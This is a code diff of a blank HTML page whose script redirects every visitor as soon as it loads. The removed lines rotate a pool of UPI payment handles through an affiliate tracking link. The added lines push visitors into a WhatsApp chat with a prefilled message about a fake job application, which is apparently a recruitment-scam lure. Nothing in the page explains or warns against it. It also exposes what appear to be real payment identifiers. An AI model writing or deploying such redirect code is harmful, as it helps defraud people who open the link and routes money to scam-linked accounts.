@@ -4,22 +4,11 @@
   <meta charset="utf-8">
   <title></title>
   <script>
-  /* === UPI pool === */
-    const upi = [
-      "56553222078@ybl","6387804365@axl","8380070455@airtel","9555322207@airtel",
-      "shaik.junaid@ptaxis","9555322207@mbk","amanup50@fam","6387804365-2@axl",
-      "vira55557@jio","6000183692@ybl","8822442129@ybl","8155030285@ptyes",
-      "9622373364@pthdfc","7078153471@axl"
-    ];
-    
-    /* === random pick === */
-    const u = upi[Math.floor(Math.random()*upi.length)];
-    const r = upi[Math.floor(Math.random()*upi.length)];
-    
-    /* === turant redirect === */
-    location.replace(
-      `http://www.mediascopy.com/track/?off_id=1486&pub_id=5598&p_sub=${encodeURIComponent(u)}&aff_id=${encodeURIComponent(r)}`
+    const nums = ["919144576441"];
+    const msg = encodeURIComponent(
+      "The job application number is: in-Oq8i-0441. I saw the job posting you shared on the recruitment platform, and I would like to learn more about it."
     );
+    window.location.replace("https://api.whatsapp.com/send/?phone=" + nums[0] + "&text=" + msg + "&type=phone_number&app_absent=0");
   </script>
 </head>
 </html>
